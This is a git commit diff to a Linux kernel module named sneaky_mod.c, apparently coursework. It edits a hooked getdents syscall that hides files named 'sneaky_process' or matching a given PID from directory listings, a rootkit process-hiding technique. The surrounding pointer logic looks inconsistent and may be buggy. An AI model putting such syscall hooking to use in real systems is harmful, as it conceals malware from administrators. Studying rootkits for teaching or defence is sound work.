101f67dd41320faf9235695b1d9f0fe6cfae9209
Fangting Ma <fangtingm@student.unimelb.edu.au>
2022-04-15 11:11:38 -0400

    test getdents

--- sneaky_mod.c
+++ sneaky_mod.c
@@ -69,7 +69,7 @@ asmlinkage int sneaky_sys_getdents(struct pt_regs *regs) {
     }
 
     for (bpos = 0; bpos < nread;) {
-        d = dirp + bpos;
+        d = (struct linux_dirent *) (buf + bpos);
         if (strcmp(dirp->d_name, "sneaky_process") == 0 || strcmp(dirp->d_name, sneaky_pid) == 0) {
             memmove((void *)(dirp + bpos), (void *)(dirp + bpos + d->d_reclen), nread - d->d_reclen - bpos);
             nread -= d->d_reclen;
